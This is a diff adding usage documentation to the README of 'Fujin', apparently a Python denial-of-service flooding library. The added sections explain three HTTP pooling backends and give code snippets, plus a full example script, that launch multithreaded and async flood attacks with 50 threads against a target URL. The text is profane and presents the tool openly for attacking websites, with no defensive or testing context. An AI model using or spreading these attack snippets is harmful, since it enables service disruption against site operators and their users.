@@ -61,5 +61,46 @@ ddos.multiproc_sync_attack(processes=50, daemon=True)
 ddos.multiproc_async_attack(processes=50, daemon=True)
 ```
 
+## Choose a pooling manager
+Fujin gives you a choice of 3 pooling managers
+- Python Requests ( requests.session() )
+- AIOHTTTP Async Based Session Manager ( aiohttp.ClientSession() )
+- URLLIB3 Pooling Manager ( urllib3.PoolingManager() )
+
+Make sure you choose a pooling manager otherwise the program will prompt you to choose one. I do this because some of the pooling managers are freakishly powerful
+
+#### Python requests
+```
+ddos = fujin(url="fuckingwebsite.com")
+ddos.thread_async_attack(threads=50, pooling_manager="requests")
+```
+
+#### AIOHTTP
+```
+ddos = fujin(url="fuckingwebsite.com")
+ddos.thread_async_attack(threads=50, pooling_manager="aiohttp")
+```
+
+#### URLLIB3
+```
+ddos = fujin(url="fuckingwebsite.com")
+ddos.thread_async_attack(threads=50, pooling_manager="urllib3")
+```
+
+# Example Script
+```
+from Fujin import fujin
+
+url = "yourwebsite.com"
+
+headers = {
+  "User-Agent": "some user agent",
+  "Accept-Encoding": "gzip"
+}
+
+ddos = fujin(url=url, header=headers)
+ddos.thread_async_attack(threads=50, daemon=True, pooling_manager="aiohttp")
+```
+
 ## What's faster sync or async
 asnyc mate
